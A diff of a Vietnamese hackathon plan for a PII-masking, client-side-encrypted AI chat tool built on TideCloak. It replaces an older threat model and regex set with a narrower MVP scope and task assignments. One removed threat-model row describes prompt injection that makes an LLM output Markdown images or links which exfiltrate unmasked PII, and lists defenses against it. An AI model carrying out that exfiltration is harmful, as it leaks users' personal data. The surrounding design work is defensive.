@@ -1,365 +1,293 @@
-# PLAN (v3 — Bản Chuẩn Hóa Cuối Cùng): PrivateChat Shield — Lớp Bảo Mật & Giả Danh Hóa Cho Chat AI Với TideCloak
+# PLAN v4 — PrivateChat Shield: MVP khả thi và phân công theo độ khó
 
-> **Trạng thái kiểm duyệt:** Bản v3 đã trải qua **2 vòng kiểm toán đa tác tử (Multi-Agent Review)** gồm:
-> 1. **TideCloak Technical Verifier:** Kiểm chứng SDK `@tidecloak/react`, cơ chế tag `_tide_<tag>.selfencrypt` / `.selfdecrypt`, và Quorum-Enforced Governance (QEA / Change Requests).
-> 2. **Cryptographic & Systems Security Auditor:** Kiểm toán mật mã phong bì (Envelope Encryption), HKDF-SHA256, AES-GCM Additional Authenticated Data (AAD), chống tráo bản mã/đảo thứ tự/rollback, Dual-Track History, Anonymous Gateway Tickets, và chống Markdown Exfiltration.
-> 3. **VN PII, NLP & Legal Compliance Specialist:** Xác minh điều khoản **Luật Bảo vệ dữ liệu cá nhân số 91/2025/QH15** (hiệu lực 01/01/2026) & **Nghị định 13/2023/NĐ-CP**, thiết kế bộ lọc PII tiếng Việt 3 tầng (có dấu & không dấu) và máy trạng thái `StreamingFuzzyUnmasker`.
-> 4. **RMIT Hackathon Head Judge & Mentor:** Chuẩn hóa SQL Schema, TypeScript Contracts, REST/SSE API, kịch bản Fallback Giờ thứ 6 giữ nguyên 3 trụ cột, checklist DoD từng ngày (10 ngày & 48 giờ), và Top 10 câu hỏi phản biện Giám khảo (Judge Q&A).
+> Cập nhật: 22/10/2026. Trạng thái: kế hoạch triển khai, chưa phải hệ thống đã được kiểm toán bảo mật.
+> Giả định: 4 thành viên, 48 giờ lịch với khoảng 16–20 giờ làm việc tập trung/người. Mốc H0 bắt đầu khi nhóm triển khai; phải đối chiếu với hạn nộp thực tế trước khi bắt đầu. Lộ trình 7–10 ngày là phương án mở rộng nếu thời gian cho phép.
+> Phân công đề xuất dựa trên vai trò trước đây: Khoa phụ trách kỹ thuật Tide; Khánh phụ trách tích hợp; Kin phụ trách QA/PII; Hiếu phụ trách giao diện/demo. Ước lượng cần điều chỉnh sau spike đầu tiên, không mặc định mọi thành viên có kinh nghiệm tương đương.
 
----
+## 1. Mục tiêu và lời hứa sản phẩm
 
-## 1. Bài toán & Căn cứ Thực tiễn / Pháp lý
+**PrivateChat Shield giúp giảm dữ liệu định danh gửi tới Cloud AI và mã hóa lịch sử trò chuyện trước khi lưu trên server.**
 
-### 1.1. Nỗi đau thực tế (The Problem)
-Nhân viên ngân hàng, bệnh viện, công ty luật và doanh nghiệp tại Việt Nam hàng ngày dán trực tiếp dữ liệu nhạy cảm (hồ sơ vay vốn, CCCD, sao kê STK, bệnh án, hợp đồng M&A) vào các AI public (ChatGPT, Gemini, Claude) hoặc AI Portal nội bộ.
-Khi đó, dữ liệu đối mặt với **2 điểm lộ lọt chí mạng**:
-1. **Trên đường lên Cloud LLM (Data-in-Use / Cross-Border):** Nhà cung cấp LLM ngoại quốc thấy toàn bộ định danh cá nhân (PII) dạng bản rõ.
-2. **Tại máy chủ lưu trữ lịch sử chat (Data-at-Rest / Insider Threat):** Nhà phát triển ứng dụng, quản trị viên cơ sở dữ liệu (DBA), Root Admin hoặc hacker tấn công DB có thể đọc trọn bộ lịch sử hội thoại và tự ý nâng quyền truy cập.
+Persona duy nhất của MVP: chuyên viên tín dụng cần soạn bản tóm tắt hồ sơ hoặc danh sách giấy tờ còn thiếu từ dữ liệu khách hàng giả lập. MVP không ra quyết định cho vay và không cần giải bài toán thẩm định tín dụng tự động.
 
-### 1.2. Căn cứ Pháp lý Việt Nam (Đã kiểm chứng chính xác 100%)
-- **Luật Bảo vệ dữ liệu cá nhân số 91/2025/QH15** *(Quốc hội khóa XV thông qua ngày 26/06/2025, **có hiệu lực từ ngày 01/01/2026**)*:
-  - **Khoản 1 Điều 30 (Xử lý DLCN trong AI & Cloud):** *"Dữ liệu cá nhân trong môi trường dữ liệu lớn, **trí tuệ nhân tạo**, chuỗi khối, vũ trụ ảo và **điện toán đám mây** phải được xử lý đúng mục đích và **giới hạn trong phạm vi cần thiết**..."*
-  - **Điều 20 & Điều 21 (Chuyển DLCN xuyên biên giới):** Sử dụng nền tảng đặt ngoài lãnh thổ Việt Nam để xử lý DLCN thu thập tại Việt Nam cấu thành hành vi chuyển DLCN xuyên biên giới, bắt buộc lập Hồ sơ đánh giá tác động gửi cơ quan chuyên trách (Cục A05 - Bộ Công an) trong 60 ngày; vi phạm có thể bị phạt tới **5% tổng doanh thu năm trước tại Việt Nam** hoặc tối đa **3 tỷ đồng**.
-  - **Khoản 1 Điều 2 & Điều 14:** Quy định về **khử nhận dạng dữ liệu cá nhân**.
-- **Nghị định 13/2023/NĐ-CP** *(Hiệu lực 01/07/2023)*:
-  - **Khoản 4 Điều 2:** Xếp thông tin **hồ sơ bệnh án** (Điểm c) và **thông tin định danh, tài khoản, tiền gửi, giao dịch của khách hàng tổ chức tín dụng/ngân hàng** (Điểm g) vào nhóm **Dữ liệu cá nhân nhạy cảm**.
-  - **Điều 24 & Điều 25:** Yêu cầu Hồ sơ đánh giá tác động xử lý DLCN (DPIA) và chuyển DLCN ra nước ngoài.
+Ba kết quả cần chứng minh:
 
----
+1. Trình duyệt che những định danh được phát hiện hoặc người dùng chọn trước khi gửi prompt.
+2. Database chỉ lưu nội dung hội thoại và bảng ánh xạ PII dưới dạng bản mã; quyền mở khóa được tích hợp thật với TideCloak.
+3. Một thay đổi quản trị nằm trong phạm vi QEA không có hiệu lực nếu chưa đủ phê duyệt theo cấu hình thực tế.
 
-## 2. Giải pháp: 3 Trụ cột Bảo mật ("PrivateChat Shield")
+**Giới hạn phải nói rõ:** LLM và AI Gateway vẫn nhận được nội dung đã che định danh. Pseudonymisation không bảo mật toàn bộ ý nghĩa câu chat và không bảo đảm chống tái định danh. Nếu yêu cầu là “nhà cung cấp tuyệt đối không nhận nội dung”, tác vụ đó không được gửi qua đường cloud của MVP; local inference/TEE là lộ trình riêng.
 
-1. **Trụ cột 1 — Mã hóa Phong bì Phía Client, Khóa Bảo vệ Ngưỡng (Threshold-Protected Client-Side Envelope Encryption):**
-   - Mỗi hội thoại được mã hóa ngay trên trình duyệt bằng khóa AES-256-GCM dẫn xuất từ khóa gốc hội thoại `K_conv`.
-   - Chỉ duy nhất `K_conv` được bọc (wrap) qua mạng lưới node phi tập trung (ORK) của **TideCloak** bằng mật mã ngưỡng (*Ineffable Cryptography*). Không một bên nào — kể cả nhóm phát triển, Cloud Provider hay Tide — giữ khóa đầy đủ.
-2. **Trụ cột 2 — Quản trị Đa chữ ký, Xóa sổ "God Admin" (Quorum-Enforced Governance / QEA):**
-   - Mọi thao tác nhạy cảm của Admin (như tự cấp role giải mã kho dữ liệu chung, thay đổi chính sách bảo mật) đều bị chặn lại thành **Change Request** và bắt buộc phải có chữ ký số phê duyệt của **Quorum các Admin độc lập**.
-   - **Đây là vũ khí khác biệt độc nhất** của sản phẩm so với các công cụ che PII thông thường.
-3. **Trụ cột 3 — Giả danh hóa PII Tiếng Việt Chuyên sâu Trước Khi Gửi LLM (Client-Side VN Pseudonymisation):**
-   - Pipeline 3 tầng chạy 100% trên trình duyệt phát hiện và thay thế 12 nhóm thực thể nhạy cảm Việt Nam (`[NAME_1]`, `[CCCD_1]`, `[STK_1]`...) trước khi gửi qua AI Gateway. Khi LLM stream câu trả lời về, máy trạng thái trên trình duyệt tự động ghép lại giá trị thật theo thời gian thực.
+Pitch đề xuất:
 
-**Headline Pitch:**
-> *"Không ai — kể cả DBA, Root Admin hay chính chúng tôi — đọc được lịch sử chat AI của bạn. Còn AI trên Cloud thì giải quyết bài toán của bạn mà không hề biết bạn là ai."*
+> “Che dữ liệu định danh trước khi gửi AI. Mã hóa lịch sử trước khi lưu. Dùng TideCloak để kiểm soát mở khóa và quản trị quyền bằng phê duyệt nhiều bên.”
 
----
+## 2. Chốt phạm vi trước khi chia việc
 
-## 3. Quy tắc Ngôn từ Khi Pitch (BẮT BUỘC Tuân Thủ)
+| Mức | Nội dung | Quyết định |
+|---|---|---|
+| Must | Đăng nhập Tide thật; wrap/unwrap khóa; kiểm thử hai người dùng; một luồng QEA thật | Điều kiện xác nhận tích hợp Tide thành công |
+| Must | Mã hóa phía client bằng WebCrypto; lưu và mở lại hội thoại; phát hiện sửa/tráo ciphertext | Chức năng lưu trữ cốt lõi |
+| Must | Che CCCD, SĐT, email, STK bằng quy tắc; tên bằng từ điển/đánh dấu thủ công; preview trước gửi | Chỉ 5 nhóm PII trong MVP |
+| Must | Chat nhiều lượt chỉ gửi bản đã che; một provider; output text thuần | Hoàn thành luồng xuyên suốt trước |
+| Must | Dữ liệu tổng hợp, kiểm thử quyền truy cập, báo cáo kết quả và video demo | Bằng chứng đi cùng sản phẩm |
+| Should | UI so sánh nội dung trước/sau che, copy kết quả, tên hội thoại mã hóa | Làm sau khi Must đã chạy |
+| Later | Streaming, fuzzy unmasking, Markdown, NER/ONNX, 12 nhóm PII, Strict Mode nâng cao | Không làm trong bản 48 giờ |
+| Later | Anonymous tickets, blind signatures, relay ẩn danh | Gateway MVP có xác thực và biết tài khoản gọi |
+| Later | Chống rollback toàn bộ, crypto-shredding chống backup, escrow, Passkey PRF | Cần thiết kế và kiểm chứng riêng |
+| Later | Local LLM, GPU TEE, browser extension, chia sẻ hội thoại giữa nhiều người | Không là phụ thuộc của demo đầu tiên |
 
-| ✅ ĐƯỢC NÓI (Chính xác về mật mã & pháp lý) | ❌ KHÔNG ĐƯỢC NÓI (Sai bản chất / Giám khảo bắt bẻ) |
-|---|---|
-| *"Role-gated, threshold-protected client-side envelope encryption"* | *"E2EE giống hệt Signal"* hoặc *"Hoàn toàn trustless"* |
-| *"Server, DB và Admin đơn lẻ không đọc được lịch sử chat; thay đổi quyền bắt buộc qua Quorum"* | *"Không ai trên đời có thể tấn công được client"* |
-| *"LLM chỉ nhận prompt đã giả danh hóa; loại bỏ định danh trực tiếp với Recall X% trên bộ test tiếng Việt"* | *"AI hoàn toàn không thấy bất kỳ thông tin gì"* |
-| *"Thực thi kỹ thuật cho nguyên tắc tối thiểu hóa dữ liệu trong AI tại Khoản 1 Điều 30 Luật BVDLCN 91/2025/QH15 và hỗ trợ hồ sơ Điều 20, 21 (Luật 91) & Điều 24, 25 (NĐ 13)"* | *"Dùng app này là tự động tuân thủ 100% Luật BVDLCN / miễn trừ hoàn toàn thủ tục chuyển dữ liệu xuyên biên giới"* |
-| *"Thu hẹp niềm tin vào nhà vận hành về mã nguồn client có thể kiểm toán (auditable client code + CSP/SRI)"* | *"Server độc hại sửa code JS cũng không sao"* |
-
----
-
-## 4. Kiến trúc Hệ thống & Thiết kế Mật mã Chuẩn Hóa
+## 3. Kiến trúc MVP đơn giản
 
 ```mermaid
 flowchart LR
-  subgraph Browser["Trình duyệt Người dùng (Vùng tin cậy duy nhất giữ bản rõ)"]
-    UI["Chat UI + PII Preview + Click-to-Mask"] --> PII["VN PII Engine (Regex + Context + Họ VN)"]
-    PII <--> MAP[("PII Map (Đệm cố định ≥4KB)")]
-    UI <--> HKDF["WebCrypto HKDF-SHA256 & AES-256-GCM ( kèm AAD)"]
-    MAP <--> HKDF
-    HKDF <--> TSDK["@tidecloak/react: doEncrypt / doDecrypt (K_conv)"]
+  subgraph Client[Trình duyệt người dùng]
+    UI[Chat và PII Preview] --> MASK[Quy tắc PII và đánh dấu thủ công]
+    MASK --> HISTORY[Lịch sử rawMasked và bản hiển thị riêng]
+    HISTORY <--> CRYPTO[WebCrypto: HKDF và AES-GCM]
+    CRYPTO <--> SDK[Tide SDK: wrap/unwrap K_conv]
   end
-
-  TSDK <-->|"Bọc/Mở khóa K_conv (1 lần/hội thoại)"| TIDE["TideCloak + Mạng Tide ORK (Quorum QEA)"]
-  HKDF -->|"Chỉ lưu Ciphertext + IV"| BE["Storage & Auth Backend"]
-  BE --> DB[("PostgreSQL (0% Plaintext)")]
-  BE -.->|"Cấp Anonymous Quota Ticket"| UI
-  PII -->|"masked_text + Quota Ticket (Không có user_id)"| GW["Stateless AI Gateway (No Content Log)"]
-  GW --> LLM["Gemini API / Vertex AI (Paid Tier, No Train)"]
-  LLM -->|"SSE Stream (masked)"| GW -->|"SSE + gateway_echo"| UI
+  SDK <--> TIDE[TideCloak và Fabric]
+  CRYPTO --> STORE[Storage API có xác thực]
+  STORE --> DB[(PostgreSQL: encrypted snapshot)]
+  HISTORY -->|Chỉ context đã che, có xác thực| GW[AI Gateway]
+  GW <--> LLM[Một Cloud LLM]
+  GW -->|JSON: rawMaskedResponse| HISTORY
 ```
 
-### 4.1. Thiết kế Mật mã Phong bì Chống Giả mạo (Authenticated Envelope Encryption)
-1. **Khóa gốc hội thoại (`K_conv`) & Dẫn xuất khóa con bằng HKDF-SHA256:**
-   - Khi tạo hội thoại mới, trình duyệt sinh ngẫu nhiên `K_conv` (32 bytes CSPRNG), gọi `doEncrypt([{ data: base64(K_conv), tags: ["chat"] }])` của TideCloak một lần duy nhất để lấy `wrapped_dek` lưu vào bảng `conversations`.
-   - Khi mở hội thoại, trình duyệt gọi `doDecrypt` lấy lại `K_conv`, nạp ngay vào WebCrypto `HKDF` với thuộc tính **`extractable: false`** và xóa trắng mảng byte gốc trong RAM (`kConvBytes.fill(0)`).
-   - Từ `K_conv`, trình duyệt dẫn xuất 2 khóa con gắn chặt với `owner_sub_hash` và `conv_id`:
-     - `DEK_msg = HKDF-SHA256(K_conv, salt=conv_id, info="v1|msg_dek|" + owner_sub_hash + "|" + conv_id)`
-     - `DEK_map = HKDF-SHA256(K_conv, salt=conv_id, info="v1|map_dek|" + owner_sub_hash + "|" + conv_id)`
-   - **Tác dụng:** Nếu DBA độc hại tráo `wrapped_dek` từ Hội thoại A sang Hội thoại B, khóa dẫn xuất sẽ khác nhau và AES-GCM báo lỗi xác thực ngay lập tức.
-2. **Gắn kết ngữ cảnh bằng AES-GCM Additional Authenticated Data (AAD):**
-   - Mọi tin nhắn khi mã hóa bằng `DEK_msg` đều truyền `additionalData` (AAD):
-     $$\text{AAD}_{\text{msg}} = \text{UTF8}(\text{"v1|msg|"} \parallel \text{owner\_sub\_hash} \parallel \text{"|"} \parallel \text{conv\_id} \parallel \text{"|"} \parallel \text{msg\_index} \parallel \text{"|"} \parallel \text{role})$$
-   - Mọi bản cập nhật metadata/PII Map khi mã hóa bằng `DEK_map` đều truyền AAD:
-     $$\text{AAD}_{\text{meta}} = \text{UTF8}(\text{"v1|meta|"} \parallel \text{owner\_sub\_hash} \parallel \text{"|"} \parallel \text{conv\_id} \parallel \text{"|"} \parallel \text{meta\_version})$$
-     Bên trong JSON của `encrypted_meta` lưu kèm `last_msg_index` để phát hiện nếu DBA xóa bớt tin nhắn cuối (Truncation Attack) hoặc quay lui phiên bản Map (Rollback Attack).
-3. **Đệm kích thước theo bậc cố định (Fixed-Bucket Padding) & IV Duy nhất:**
-   - Mỗi lần mã hóa đều sinh mới `iv = crypto.getRandomValues(new Uint8Array(12))` (96-bit).
-   - Trước khi đưa vào AES-GCM, chuỗi JSON của tin nhắn được đệm vào trường `_pad` để tổng độ dài byte UTF-8 khớp đúng các bậc `512B, 2048B, 8192B, 32768B`.
-   - Riêng `encrypted_meta` (chứa `title` và `piiMap`) luôn được đệm tối thiểu **4096 bytes** (bậc kế tiếp `16384B`) để DB/Admin không thể đoán số lượng thực thể PII dựa trên độ tăng kích thước byte.
-4. **Dual-Track History (Chống rò rỉ PII ở lượt chat thứ 2):**
-   - Bản ghi tin nhắn giải mã ở client giữ song song `{ plaintext, maskedText, spans }`.
-   - Khi gửi ngữ cảnh hội thoại nhiều lượt (multi-turn context) lên AI Gateway ở lượt thứ 2, thứ 3..., trình duyệt **CHỈ ĐƯỢC lấy trường `maskedText`**, tuyệt đối không bao giờ đọc `plaintext` để gửi đi hay chạy hàm mask lại trên câu trả lời của LLM.
-5. **Crypto-Shredding 2 Cấp độ ("Quyền được xóa" thực chất):**
-   - *Cấp độ 1 (Tức thời trên App):* Xóa `wrapped_dek = NULL` trong bảng `conversations` khiến mọi bản ghi `messages` trở thành vô nghĩa.
-   - *Cấp độ 2 (Chống lại cả bản DB Backup đã bị hacker lấy cắp trước đó):* Thu hồi quyền/khóa giải mã của tag trên TideCloak thông qua Quorum — mạng lưới Tide ORK sẽ từ chối lệnh `doDecrypt` đối với cả các `wrapped_dek` nằm trong bản sao lưu cũ của kẻ tấn công.
+Quyết định kỹ thuật:
 
-### 4.2. Tách rời Danh tính tại AI Gateway (Anonymous Quota Tickets)
-- Để AI Gateway không bị bot gọi chùa làm cháy quota Gemini nhưng cũng **không biết `user_id` nào đang gửi prompt đã che**:
-  1. Khi vào phiên chat, trình duyệt gọi Auth Backend (`POST /api/quota/tickets` kèm TideCloak JWT) để lấy 1 lô 10 **Anonymous Ticket** có chữ ký HMAC/Ed25519 của server: `{ ticketId: uuid, exp: timestamp, maxTokens: 4096 }` (hoàn toàn không chứa `sub` hay `email`).
-  2. Khi gọi `POST /api/gateway/chat`, trình duyệt chỉ gửi header `X-Gateway-Ticket: <signed_ticket>` (dùng 1 lần). Gateway kiểm tra chữ ký + chống replay `ticketId` trên RAM rồi gọi Gemini.
-  3. Nhờ vậy, ngay cả khi ai đó đứng trên AI Gateway, họ chỉ thấy một prompt đã che PII đi kèm một mã vé ẩn danh.
+- Frontend React + Vite + TypeScript; backend Node.js + TypeScript; PostgreSQL. Chốt một package manager, commit lockfile và pin phiên bản SDK/container sau spike. Không dựng thêm microservice hoặc chuyển framework trong MVP.
+- Chỉ dùng một Cloud LLM đã có tài khoản/billing hoạt động. Ghi rõ provider, model ID và chính sách dữ liệu đã kiểm tra trong README. Không dùng Grounding, Files, tools hoặc lưu hội thoại phía provider trong MVP.
+- V1 dùng request/response JSON, có timeout và trạng thái thử lại; streaming là nâng cấp sau khi lưu/mở lịch sử ổn định.
+- Provider API key chỉ nằm ở backend. Gateway không ghi prompt, response, JWT hoặc PII vào log; kiểm tra cả middleware, error reporting và proxy. Đây là cấu hình vận hành, không phải bảo đảm mật mã đối với Gateway độc hại.
+- Hiển thị “Request đã che” lấy từ request thực tế của browser. Nếu kiểm tra payload backend gửi provider, chỉ bật capture tạm thời trong môi trường test với dữ liệu tổng hợp; không tạo kho `lastGatewayEcho` trên server.
 
-### 4.3. Xử lý Scope Tag của TideCloak & Kịch bản Quorum
-- **Kiểm chứng trong Giờ 1–3 Ngày 1:** Kiểm tra xem role `_tide_chat.selfdecrypt` trên TideCloak gắn khóa theo từng cá nhân (`sub`) hay theo nhóm có chung role:
-  - **Nhánh A (Khóa cô lập theo từng User):** Dữ liệu cá nhân mặc định an toàn trước các user khác và Admin. Để demo **Quorum chống God Admin** ở Mục 11, tạo thêm một kho **"Hồ sơ Tín dụng Dùng chung của Chi nhánh"** gắn với shared role `_tide_branch_vip.decrypt`. Khi Admin độc hại tự cấp role `_tide_branch_vip.decrypt` cho mình để đọc hồ sơ VIP, hệ thống TideCloak QEA sẽ treo thành **Change Request** chờ các Admin khác ký duyệt!
-  - **Nhánh B (Khóa gắn theo Role Tag):** Bắt buộc dùng dynamic tag theo từng user (`_tide_u_<sub_hash>.selfencrypt`) kết hợp bọc HKDF với khóa lưu trên thiết bị (WebAuthn PRF / PIN). Khi Admin tự cấp role `_tide_u_<victim_hash>.selfdecrypt` cho mình, lệnh đó bị chặn bởi **Change Request Quorum**.
+## 4. Cổng khả thi TideCloak: làm trước các tính năng nâng cao
 
----
+Khoa sở hữu spike; Khánh cùng xác minh tích hợp. Dùng tài liệu Tide và SDK thực tế, không suy luận semantics từ tên role.
 
-## 5. Mô hình Đe dọa Trung thực (Threat Model — Trình bày 1 Slide)
-
-| Mối đe dọa / Kẻ tấn công | Trạng thái | Cơ chế bảo vệ hoặc Giới hạn thực tế |
+| Mốc | Phải kiểm tra | Bằng chứng / quyết định |
 |---|---|---|
-| **1. Lộ toàn bộ DB (SQL Injection / Backup Leak)** | ✅ **Bảo vệ tuyệt đối** | DB chỉ chứa AES-256-GCM ciphertext; `wrapped_dek` cần mạng Tide ORK; thu hồi quyền trên Tide vô hiệu hóa cả bản backup cũ. |
-| **2. DBA độc hại tráo bản mã / đảo thứ tự / xóa tin nhắn cuối** | ✅ **Phát hiện & Chặn 100%** | HKDF gắn `conv_id` + AES-GCM `additionalData` (AAD) gắn `msg_index`, `role` + kiểm tra `last_msg_index` trong `encrypted_meta`. |
-| **3. "God Admin" tự cấp quyền giải mã trên IAM** | ✅ **Chặn bởi Quorum** | TideCloak QEA bắt buộc Change Request phải đủ chữ ký số từ Quorum các Admin độc lập. |
-| **4. Nhà cung cấp Cloud LLM thấy định danh trực tiếp (PII)** | ✅ **Đã che trên trình duyệt** | 12 nhóm PII Việt Nam bị thay bằng `[LOẠI_SỐ]` trước khi rời trình duyệt; lịch sử đa lượt dùng Dual-Track (`maskedText`). |
-| **5. AI Gateway liên kết danh tính người dùng với nội dung chat** | ✅ **Đã tách rời** | Xác thực qua `Anonymous Quota Ticket` dùng 1 lần, không chứa `user_id`/`email`. (Lưu ý: Tầng TCP vẫn thấy IP nếu không qua relay). |
-| **6. Prompt Injection sinh ảnh/link Markdown làm rò rỉ PII sau khi ghép** | ✅ **Đã khóa 3 lớp** | Cấm `unmask()` trong thuộc tính URL (`href`/`src`); vô hiệu hóa thẻ `<img>` trong Markdown; khóa CSP `img-src 'self' data:`. |
-| **7. Tái định danh qua ngữ cảnh (Quasi-identifiers: chức vụ, vụ việc đặc thù)** | ⚠️ **Giảm thiểu một phần** | Chế độ **Strict Mode** khái quát hóa thêm `ORG`, `MONEY`, `DATE`, `ADDR` + chấm điểm rủi ro (`riskScore`) + người dùng bôi đen thêm. |
-| **8. Nhà vận hành phát hành bản build JS độc hại / XSS trên trình duyệt** | ⚠️ **Giới hạn cố hữu của Web** | Giảm thiểu bằng CSP chặt (`connect-src` allowlist), Subresource Integrity (SRI), Public Build Hash, và đóng gói Browser Extension ghim phiên bản ở v2. |
-| **9. Máy trạm của người dùng bị cài mã độc / keylogger** | ❌ **Ngoài phạm vi** | Không hệ thống mã hóa đầu-cuối nào bảo vệ được nếu thiết bị đầu cuối hiển thị bản rõ đã bị chiếm quyền điều khiển. |
+| H0–H2 | Container/license/realm chạy; đăng nhập; `doEncrypt` rồi `doDecrypt` một chuỗi từ browser | Lưu version, cấu hình tái tạo, lỗi và kết quả thực tế |
+| H2–H4 | User A bọc khóa; A mở lại được; user B cùng role không mở được ciphertext của A | Ghi kết quả và xác nhận scope user/tag; chưa kết luận an toàn trước khi test |
+| H2–H6 | Thay đổi role/chính sách thuộc phạm vi QEA tạo Change Request; chưa đủ approver thì chưa có hiệu lực | Hai danh tính admin độc lập, cấu hình quorum rõ ràng; quay thao tác thật |
+| H6 | Chốt tích hợp được hay đang bị chặn | Giảm phạm vi ngay nếu chưa đạt, không phát sinh hệ mật mã fallback |
 
----
+Phải phân biệt: QEA quản trị thay đổi quyền không đồng nghĩa mỗi lượt chat cần hai người duyệt. Nếu self-encryption cô lập theo user, gán cùng role cho admin cũng không chứng minh admin có thể giải mã dữ liệu của user khác; demo QEA phải giải thích đúng thao tác đang được bảo vệ.
 
-## 6. Đặc tả Kỹ thuật Nhận diện & Giả danh hóa PII Tiếng Việt (100% In-Browser TypeScript)
+Nếu A/B cùng role mở được dữ liệu của nhau, dừng lưu dữ liệu có tính nhạy cảm và xác minh cơ chế cô lập với tài liệu/sponsor. Không tự chữa bằng PIN, tag động hoặc Passkey chưa kiểm thử trong thời gian còn lại.
 
-### 6.1. Thứ tự Ưu tiên & Quy tắc Chống Đè Nhãn (Non-Overlapping Span Merge)
-Pipeline quét văn bản theo thứ tự độ đặc thù giảm dần và hợp nhất các span không chồng lấn (ưu tiên span có độ tin cậy cao hơn hoặc dài hơn):
-`USER_DICT` $\rightarrow$ `EMAIL` $\rightarrow$ `CCCD` $\rightarrow$ `PHONE` $\rightarrow$ `TAX_ID (MST)` $\rightarrow$ `LICENSE_PLATE` $\rightarrow$ `STK` $\rightarrow$ `CMND` $\rightarrow$ `DATE` $\rightarrow$ `MONEY` $\rightarrow$ `ADDR` $\rightarrow$ `NAME` $\rightarrow$ `ORG`.
+Nếu lỗi mạng/license chặn spike:
 
-### 6.2. Bộ Regex & Hàm Kiểm chứng Cấu trúc Việt Nam (Copy-Paste Ready)
-```typescript
-// 1. CCCD 12 số: Kiểm tra đúng 63 mã tỉnh Việt Nam (001-096) + mã thế kỷ/giới tính
-const VALID_CCCD_PROVINCES = new Set([
-  '001','002','004','006','008','010','011','012','014','015','017','019','020','022','024','025','026','027',
-  '030','031','033','034','035','036','037','038','040','042','044','045','046','048','049','051','052','054',
-  '056','058','060','062','064','066','067','068','070','072','074','075','077','079','080','082','083','084',
-  '086','087','089','091','092','093','094','095','096'
-]);
-export const CCCD_REGEX = /(?<!\d)(0\d{2})[\s.]?([0-9]\d{2})[\s.]?(\d{3})[\s.]?(\d{3})(?!\d)/g;
+- Tiếp tục xây UI/PII và hợp đồng storage bằng adapter mock với dữ liệu tổng hợp, gắn nhãn rõ “Mock — chưa chứng minh Tide”. Không bật mock ngầm trong bản trình diễn.
+- Khoa ghi blocker và làm việc với hỗ trợ kỹ thuật nếu nhóm tự liên hệ; các thành viên khác tiếp tục phần độc lập.
+- Khi đã có tích hợp thật, quay video dự phòng. Nếu đến hạn vẫn chưa tích hợp được, công bố phần chưa hoàn thành; không thay bằng cảnh báo “BLOCKED” giả.
 
-export function isValidCCCD(match: RegExpExecArray, fullText: string): boolean {
-  const digits = match[0].replace(/[\s.]/g, '');
-  if (digits.length !== 12) return false;
-  const province = digits.slice(0, 3);
-  const genderCentury = Number(digits[3]);
-  const hasCtx = /(?:cccd|căn cước|định danh|cmnd|số thẻ)/i.test(
-    fullText.slice(Math.max(0, match.index - 35), match.index)
-  );
-  return (VALID_CCCD_PROVINCES.has(province) && genderCentury <= 3) || (hasCtx && genderCentury <= 9);
+## 5. Thiết kế lưu trữ và mật mã đủ cho MVP
+
+### 5.1. Một encrypted snapshot cho mỗi hội thoại
+
+Để tránh lỗi ghi tin nhắn và PII map lệch nhau, MVP lưu toàn bộ trạng thái hội thoại nhỏ trong một snapshot mã hóa. Không cần bảng `messages` riêng trong bản đầu.
+
+```text
+ConversationRow {
+  id: UUID,                 // client sinh trước khi dẫn xuất khóa
+  owner_id: string,         // backend lấy từ issuer + sub đã xác thực
+  wrapped_key: string,      // K_conv được bọc qua Tide
+  revision: integer,
+  iv: base64,
+  encrypted_state: base64,
+  schema_version: 1,
+  created_at, updated_at
 }
 
-// 2. Số điện thoại Việt Nam (Di động 03,05,07,08,09 & Cố định 02x, hỗ trợ +84 và dấu chấm/gạch/cách)
-export const VN_PHONE_REGEX = /(?<!\d)(?:(?:\+?84|\(\+?84\))[\s.-]?|0)(?:(?:3[2-9]|5[25689]|7[06-9]|8[1-9]|9[0-46-9])(?:[\s.-]?\d){7}|2\d{1,2}(?:[\s.-]?\d){7,8})(?!\d)/g;
-
-// 3. Số tài khoản Ngân hàng (6-19 số) + Thẻ Napas (9704...) kèm Context Window ±55 ký tự
-export const NAPAS_CARD_REGEX = /(?<!\d)9704(?:[\s.-]?\d{4}){3}(?!\d)/g;
-export const BANK_CTX_KEYWORDS = /\b(?:stk|số tài khoản|so tai khoan|số tk|so tk|tài khoản|tai khoan|chuyển khoản|chuyen khoan|thụ hưởng|thu huong|vietcombank|vcb|techcombank|tcb|mbbank|\bmb\b|bidv|vietinbank|ctg|agribank|vpbank|tpbank|acb|sacombank|stb|hdbank|vib|shb|seabank|msb|ocb|lpbank|eximbank|momo|zalopay)\b/i;
-
-// 4. Mã số thuế (10 số kèm context hoặc 13 số dạng XXXXXXXXXX-XXX)
-export const MST_13_REGEX = /(?<!\d)(0[1-9]|[1-8]\d|9[0-6])\d{8}-\d{3}(?!\d)/g;
-export const MST_10_CTX_REGEX = /(?:\b(?:mst|mã số thuế|ma so thue|tax(?:\s*code|\s*id)?)\b[\s:.-]{0,15})((?:0[1-9]|[1-8]\d|9[0-6])\d{8})(?!\d)/gi;
-
-// 5. Biển số xe, Email, Ngày tháng, Số tiền, Địa chỉ phân cấp Việt Nam
-export const VN_PLATE_REGEX = /\b([1-9]\d)[\s-]?([A-Z]{1,2}\d?|[A-Z]\d)[\s-]?(\d{3}\.\d{2}|\d{4,5})\b/g;
-export const EMAIL_REGEX = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g;
-export const VN_DATE_REGEX = /\b(?:(?:ngày|ngay)\s+)?(0?[1-9]|[12]\d|3[01])(?:\s*[\/.-]\s*|\s+(?:tháng|thang)\s+)(0?[1-9]|1[0-2])(?:(?:\s*[\/.-]\s*|\s+(?:năm|nam)\s+)((?:19|20)\d{2}))?\b/gi;
-export const VN_MONEY_REGEX = /(?<!\w)(?:(\d{1,3}(?:[.,]\d{3})+|\d+(?:[.,]\d+)?)\s*(tỷ|tỉ|ty|ti|triệu|trieu|tr|nghìn|nghin|ngàn|ngan|k|đồng|dong|vnđ|vnd|đ|usd|\$)(?:\s*(?:đồng|dong|vnđ|vnd|rưỡi|ruoi|\d{1,2}\b))?)(?!\w)/gi;
